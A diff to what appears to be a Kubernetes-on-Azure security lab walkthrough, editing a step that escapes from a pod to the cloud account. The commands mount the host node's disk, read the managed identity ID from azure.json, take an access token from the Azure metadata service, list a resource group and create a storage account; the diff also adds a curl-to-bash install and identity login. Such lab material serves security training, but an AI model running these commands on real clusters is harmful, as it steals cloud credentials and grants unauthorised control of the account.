@@ -326,19 +326,30 @@ redis-cli -h $REDIS_HOST -a $REDIS_KEY get data
 We can also use the underlying cloud identity and try to escape even further. Run the following snippet to get a valid cloud provider token (in our case the Client ID of the underlying Managed Identity):
 
 ```bash
-mount $(df | awk '{print $1}' | grep "/dev/sd") /tmp
+mkdir /temp
+mount $(df | awk '{print $1}' | grep "/dev/sd") /temp
 
-IDENTITY=$(cat /tmp/etc/kubernetes/azure.json | jq -r .userAssignedIdentityID)
+IDENTITY=$(cat /temp/etc/kubernetes/azure.json | jq -r .userAssignedIdentityID)
 
 TOKEN=$(curl 'http://169.254.169.254/metadata/identity/oauth2/token?client_id='$IDENTITY'&api-version=2018-02-01&resource=https%3A%2F%2Fmanagement.azure.com%2F' -H Metadata:true -s | jq -r .access_token)
 
-SUBSCRIPTION=$(cat /tmp/etc/kubernetes/azure.json | jq -r .subscriptionId)
-RG=$(cat /tmp/etc/kubernetes/azure.json | jq -r .resourceGroup)
+SUBSCRIPTION=$(cat /temp/etc/kubernetes/azure.json | jq -r .subscriptionId)
+RG=$(cat /temp/etc/kubernetes/azure.json | jq -r .resourceGroup)
 
 curl -X GET -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" https://management.azure.com/subscriptions/$SUBSCRIPTION/resourcegroups/$RG?api-version=2021-04-01 | jq
 
 STAC=my0stac
-curl -X PUT -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" --data '{"sku":{"name":"Standard_LRS"},"kind":"StorageV2","location":"westeurope"}' https://management.azure.com/subscriptions/$SUBSCRIPTION/resourcegroups/$RG/providers/Microsoft.Storage/storageAccounts/my0stac?api-version=2018-02-01 | jq
+curl -X PUT -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" --data '{"sku":{"name":"Standard_LRS"},"kind":"StorageV2","location":"westeurope"}' https://management.azure.com/subscriptions/$SUBSCRIPTION/resourcegroups/$RG/providers/Microsoft.Storage/storageAccounts/$STAC?api-version=2018-02-01 | jq
+```
+
+To verify the created Storage Account we will now install the Azure CLI, authenticate and then list it:
+
+```bash
+curl -sL https://aka.ms/InstallAzureCLIDeb | bash
+
+az login --identity --username $IDENTITY
+
+az storage account list -g $RG -o table
 ```
 
 <details>
@@ -347,20 +358,21 @@ curl -X PUT -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json
 First, we need to mount the local node's file system to access the underlying identity ID:
 
 ```bash
-mount $(df | awk '{print $1}' | grep "/dev/sd") /tmp
+mount $(df | awk '{print $1}' | grep "/dev/sd") /temp
 ```
 
 We can now retrieve the cloud identity used and request a valid token via the cloud metadata service (in our case Azure Instance Metadata Service):
 
 ```bash
-mount $(df | awk '{print $1}' | grep "/dev/sd") /tmp
+mkdir /temp
+mount $(df | awk '{print $1}' | grep "/dev/sd") /temp
 
-IDENTITY=$(cat /tmp/etc/kubernetes/azure.json | jq -r .userAssignedIdentityID)
+IDENTITY=$(cat /temp/etc/kubernetes/azure.json | jq -r .userAssignedIdentityID)
 
 TOKEN=$(curl 'http://169.254.169.254/metadata/identity/oauth2/token?client_id='$IDENTITY'&api-version=2018-02-01&resource=https%3A%2F%2Fmanagement.azure.com%2F' -H Metadata:true -s | jq -r .access_token)
 
-SUBSCRIPTION=$(cat /tmp/etc/kubernetes/azure.json | jq -r .subscriptionId)
-RG=$(cat /tmp/etc/kubernetes/azure.json | jq -r .resourceGroup)
+SUBSCRIPTION=$(cat /temp/etc/kubernetes/azure.json | jq -r .subscriptionId)
+RG=$(cat /temp/etc/kubernetes/azure.json | jq -r .resourceGroup)
 
 curl -X GET -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" https://management.azure.com/subscriptions/$SUBSCRIPTION/resourcegroups/$RG?api-version=2021-04-01 | jq
 
@@ -369,6 +381,16 @@ curl -X PUT -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json
 ```
 
 We could now use the secret to talk to the cloud provider management plane (in this case Azure Resource Manager) and try to create or access further resources. Furthermore we were able to create an Azure Storage Account.
+
+To verify the created Storage Account we will now install the Azure CLI, authenticate and then list it:
+
+```bash
+curl -sL https://aka.ms/InstallAzureCLIDeb | bash
+
+az login --identity --username $IDENTITY
+
+az storage account list -g $RG -o table
+```
 
 </details>
 
